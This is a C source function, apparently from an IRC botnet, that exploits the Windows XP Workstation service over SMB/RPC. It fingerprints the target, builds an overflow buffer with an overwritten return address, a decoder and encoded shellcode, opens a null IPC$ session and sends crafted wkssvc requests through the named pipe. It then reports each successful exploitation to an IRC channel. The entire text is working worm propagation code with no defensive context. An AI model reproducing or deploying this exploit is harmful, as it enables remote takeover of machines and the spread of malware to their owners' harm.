BOOL ScriptGod_WKSSVC( unsigned long nTargetID, EXINFO exinfo )
{
	int TargetOS;
	char szShellBuf[ 512 ];
	int iShellSize;

	// =============================
	char* pszTarget;
	// ---
	char szNetbiosTarget[ 8192 ];
	wchar_t wszNetbiosTarget[ 8192 ];
	unsigned char szShellcodeEncoded[ ( sizeof( szShellBuf ) * 2 ) + 1 ];
	unsigned char szExploitsData[ 3500 ];
	unsigned long nExploitsDataPos;
	wchar_t wszExploitsData[ sizeof( szExploitsData ) ];
	// ---
	char szIPC[ 8192 ];
	NETRESOURCE NetSource;
	// ---
	char szPipe[ 8192 ];
	HANDLE hPipe;
	// ---
	RPC_ReqBind BindPacket;
	unsigned long nBytesWritten;
	RPC_ReqNorm ReqNormalHeader;
	unsigned long nPacketSize;
	unsigned char* pPacket;
	unsigned long nPacketPos;
	// ============================

	// check if xp
	TargetOS = FpHost( exinfo.ip, FP_RPC );
	if( TargetOS != OS_WINXP )
		return FALSE;

	// parameters
	pszTarget = exinfo.ip;

	// get shellcode
	iShellSize = GetRNS0TerminatedShellcode( szShellBuf, sizeof( szShellBuf ), GetIP( exinfo.sock ), filename );
	if( !iShellSize )
		return FALSE;

	// generate exploits buffer
	// ========================
	memset( szShellcodeEncoded, 0, sizeof( szShellcodeEncoded ) );
	memset( szExploitsData, 0, sizeof( szExploitsData ) );
	memset( wszExploitsData, 0, sizeof( wszExploitsData ) );

	// fill with NOPs (using inc ecx instead of NOP, 0-terminated-string)
	memset( szExploitsData, 'A', sizeof( szExploitsData ) - 1 );

	// new EIP
	*(unsigned long*)( &szExploitsData[ Targets[ nTargetID ].nNewEIP_BufferOffset ] ) = Targets[ nTargetID ].nNewEIP;

	// some NOPs
	nExploitsDataPos = 2300;

	// add stack
	memcpy( &szExploitsData[ nExploitsDataPos ], szStack, sizeof( szStack ) - 1 );
	nExploitsDataPos += sizeof( szStack ) - 1;

	// add decoder
	memcpy( &szExploitsData[ nExploitsDataPos ], szDecoder, sizeof( szDecoder ) - 1 );
	nExploitsDataPos += sizeof( szDecoder ) - 1;

	// add shellcode
	// - bind port
	// - encode
	Encode( (unsigned char*)szShellBuf, iShellSize, szShellcodeEncoded );
	// - add
	memcpy( &szExploitsData[ nExploitsDataPos ], szShellcodeEncoded, strlen( (char*)szShellcodeEncoded ) );
	nExploitsDataPos += strlen( (char*)szShellcodeEncoded );
	// - 0 terminaten for decoder
	szExploitsData[ nExploitsDataPos ] = 0;
	nExploitsDataPos += 1;

	// convert to UNICODE
	// ==================
	for( int n = 0; n < sizeof( szExploitsData ); n++ )
		wszExploitsData[ n ] = szExploitsData[ n ];
	//MultiByteToWideChar( CP_ACP, 0, (char*)szExploitsData, -1, wszExploitsData, sizeof( wszExploitsData ) / sizeof( wchar_t ) );
	snprintf( szNetbiosTarget, sizeof( szNetbiosTarget ), "\\\\%s", pszTarget );
	mbstowcs( wszNetbiosTarget, szNetbiosTarget, sizeof( wszNetbiosTarget ) / sizeof( wchar_t ) );

	// create NULL session
	// ===================
	if( strcmpi( pszTarget, "." ) )
	{
		snprintf( szIPC, sizeof( szIPC ), "\\\\%s\\ipc$", pszTarget );
		memset( &NetSource, 0 ,sizeof( NetSource ) );
		NetSource.lpRemoteName = szIPC;
		fWNetAddConnection2( &NetSource, "", "", 0 );
	}
	// ===================

	// connect to pipe
	// ===============
	snprintf( szPipe, sizeof( szPipe ), "\\\\%s\\pipe\\wkssvc", pszTarget );
	hPipe = CreateFile( szPipe, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL );
	if( hPipe == INVALID_HANDLE_VALUE )
	{
		fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );
		return FALSE;
	}
	// ===============

	// bind packet
	// ===========
	memset( &BindPacket, 0, sizeof( BindPacket ) );
	BindPacket.NormalHeader.versionmaj		= 5;
	BindPacket.NormalHeader.versionmin		= 0;
	BindPacket.NormalHeader.type			= 11;	// bind
	BindPacket.NormalHeader.flags			= 3;	// first + last fragment
	BindPacket.NormalHeader.representation	= 0x00000010; // little endian
	BindPacket.NormalHeader.fraglength		= sizeof( BindPacket );
	BindPacket.NormalHeader.authlength		= 0;
	BindPacket.NormalHeader.callid			= 1;
	BindPacket.maxtsize						= 4280;
	BindPacket.maxrsize						= 4280;
	BindPacket.assocgid						= 0;
	BindPacket.numelements					= 1;
	BindPacket.contextid					= 0;
	BindPacket.numsyntaxes					= 1;
	BindPacket.Interface1.version			= 1;
	memcpy( BindPacket.Interface1.byte, "\x98\xd0\xff\x6b\x12\xa1\x10\x36\x98\x33\x46\xc3\xf8\x7e\x34\x5a", 16 );
	BindPacket.Interface2.version			= 2;
	memcpy( BindPacket.Interface2.byte, "\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60", 16 );

	// send
	if( !WriteFile( hPipe, &BindPacket, sizeof( RPC_ReqBind ), &nBytesWritten, NULL ) )
	{
		CloseHandle( hPipe );
		fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );
		return FALSE;
	}
	// ===========

	// request
	// =======
	// generate packet
	// ---------------

	// calc packet size
	nPacketSize = 0;
	nPacketSize += sizeof( szWKSSVCUnknown1 ) - 1;
	nPacketSize += sizeof( UNISTR2 );
	nPacketSize += ( wcslen( wszNetbiosTarget ) + 1 ) * sizeof( wchar_t );
	while( nPacketSize % 4 )
		nPacketSize++;
	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
		nPacketSize += sizeof( szWKSSVCUnknown2 ) - 1;
	nPacketSize += sizeof( UNISTR2 );
	nPacketSize += ( wcslen( wszExploitsData ) + 1 ) * sizeof( wchar_t );
	while( nPacketSize % 4 )
		nPacketSize++;
	nPacketSize += 8; // szWSSKVCUnknown3
	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
		nPacketSize += 4; // NetAddAlternateComputerName = reserved
	else
		nPacketSize += 2; // NetValidateName = NameType

	// alloc packet
	pPacket = (unsigned char*)malloc( nPacketSize );
	if( !pPacket )
	{
		CloseHandle( hPipe );
		fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );
		return FALSE;
	}
	memset( pPacket, 0, nPacketSize );

	// build packet
	nPacketPos = 0;

	// - szWKSSVCUnknown1
	memcpy( &pPacket[ nPacketPos ], szWKSSVCUnknown1, sizeof( szWKSSVCUnknown1 ) - 1 );
	nPacketPos += sizeof( szWKSSVCUnknown1 ) - 1;

	// - wszNetbiosTarget
	( (UNISTR2*)&pPacket[ nPacketPos ] )->length	= wcslen( wszNetbiosTarget ) + 1;
	( (UNISTR2*)&pPacket[ nPacketPos ] )->unknown	= 0;
	( (UNISTR2*)&pPacket[ nPacketPos ] )->maxlength	= ( (UNISTR2*)&pPacket[ nPacketPos ] )->length;
	nPacketPos += sizeof( UNISTR2 );

	wcscpy( (wchar_t*)&pPacket[ nPacketPos ], wszNetbiosTarget );
	nPacketPos += ( wcslen( wszNetbiosTarget ) + 1 ) * sizeof( wchar_t );

	// - align
	while( nPacketPos % 4 )
		nPacketPos++;

	// - szWKSSVCUnknown2
	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
	{
		memcpy( &pPacket[ nPacketPos ], szWKSSVCUnknown2, sizeof( szWKSSVCUnknown2 ) - 1 );
		nPacketPos += sizeof( szWKSSVCUnknown2 ) - 1;
	}

	// - wszExploitsData
	( (UNISTR2*)&pPacket[ nPacketPos ] )->length	= wcslen( wszExploitsData ) + 1;
	( (UNISTR2*)&pPacket[ nPacketPos ] )->unknown	= 0;
	( (UNISTR2*)&pPacket[ nPacketPos ] )->maxlength	= ( (UNISTR2*)&pPacket[ nPacketPos ] )->length;
	nPacketPos += sizeof( UNISTR2 );

	wcscpy( (wchar_t*)&pPacket[ nPacketPos ], wszExploitsData );
	nPacketPos += ( wcslen( wszExploitsData ) + 1 ) * sizeof( wchar_t );

	// - align
	while( nPacketPos % 4 )
		nPacketPos++;

	// - szWSSKVCUnknown3 (only eigth 0x00s)
	memset( &pPacket[ nPacketPos ], 0, 8 );
	nPacketPos += 8;

	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
	{
		// NetAddAlternateComputerName = 0
		*(DWORD*)&pPacket[ nPacketPos ] = 0;
		nPacketPos += sizeof( DWORD );
	}
	else
	{
		// NetValidateName = NetSetupMachine
		*(unsigned short*)&pPacket[ nPacketPos ] = 1;
		nPacketPos += 2;
	}

	// header
	memset( &ReqNormalHeader, 0, sizeof( ReqNormalHeader ) );
	ReqNormalHeader.NormalHeader.versionmaj		= 5;
	ReqNormalHeader.NormalHeader.versionmin		= 0;
	ReqNormalHeader.NormalHeader.type			= 0;	// request
	ReqNormalHeader.NormalHeader.flags			= 3;	// first + last fragment
	ReqNormalHeader.NormalHeader.representation	= 0x00000010; // little endian
	ReqNormalHeader.NormalHeader.authlength		= 0;
	ReqNormalHeader.NormalHeader.callid			= 1;
	ReqNormalHeader.prescontext					= 0;
	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
		ReqNormalHeader.opnum					= 27;	// NetrAddAlternateComputerName
	else
		ReqNormalHeader.opnum					= 25;	// NetrValidateName2
	// send
	if( !SendReqPacket_Part( hPipe, ReqNormalHeader, pPacket, nPacketSize, 4280, true ) )
	{
		CloseHandle( hPipe );
		free( pPacket );
		fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );
		return FALSE;
	}
	// =======

	// clean up
	// =================;
	CloseHandle( hPipe );
	free( pPacket );
	fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );

	char buffer[ IRCLINE ];
	_snprintf(buffer, sizeof(buffer), "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
	irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
	addlog(buffer);
	exploit[exinfo.exploit].stats++;

	return TRUE;
}